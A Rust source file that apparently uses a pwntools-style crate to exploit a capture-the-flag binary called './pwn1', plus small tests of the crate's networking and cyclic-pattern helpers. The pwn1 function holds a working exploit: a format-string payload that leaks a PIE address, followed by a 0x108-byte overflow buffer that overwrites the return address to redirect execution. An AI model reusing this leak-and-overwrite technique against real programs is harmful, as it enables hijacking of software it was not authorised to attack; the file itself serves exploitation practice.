use anyhow::Result;

use rusty_pwn::prelude::*;

async fn pwn1() -> Result<()> {
	let mut p = Process::new("./pwn1", false)?;

	println!("Process ID: {}", p.get_id());
	// pause();

	// Craft format string
	let fmt = format!("%{}$llx", 10 + 0x108 / 8);
	p.write_line(fmt);

	let prelude = p.read_lines(4);
	println!("{}", &prelude);

	// Leak PIE
	let pie_addr = p.read_until(b' ', false);
	let pie_addr = u64_from_bytes(&pie_addr)?;

	println!("Got pie pointer: {:x}", &pie_addr);
	let pie_base = MemoryBase::new(0x100000d9e, pie_addr);

	let prelude = p.read_lines(1);
	println!("{}", &prelude);

	// Return to new place function
	let mut buffer = Vec::new();
	buffer.append(&mut b"Expelliarmus\x00".to_vec());
	buffer.append(&mut vec![b'A'; 0x108 - buffer.len()]);
	buffer.append(&mut p64(pie_base.documented_to_leaked(0x100000da8)).to_vec());
	buffer.append(&mut p64(pie_base.documented_to_leaked(0x100000c00)).to_vec());
	buffer.push(b'\n');
	p.write(&buffer);

	// let mut fin = vec![b'A'; 0x108];
	// fin.append(&mut p64(pie_base.documented_to_leaked(0x100000c00)).to_vec());
	// fin.push(b'\n');
	// p.write(&fin);

	let result = p.interactive().await?.unwrap();
	println!("=> Exited with {}", result);

	Ok(())
}

async fn test1() -> Result<()> {
	let mut p = Process::new("localhost:12345", true)?;

	p.write_line("Hello world");
	p.write_line("Hello world2".to_string());

	let l = p.read_lines(2);
	print!("{}", l);

	Ok(())
}

async fn test2() -> Result<()> {
	let a: String = cyclic(10).collect();
	println!("{}", a);

	let l = lookup("FFAAFGAAFH");
	println!("{}", l);

	use rusty_pwn::util::debruijn;
	let b: Vec<u8> = debruijn::debruijn(3, 2).take(10).collect();
	println!("{:?}", b);

	Ok(())
}

#[tokio::main]
async fn main() -> Result<()> { test2().await }
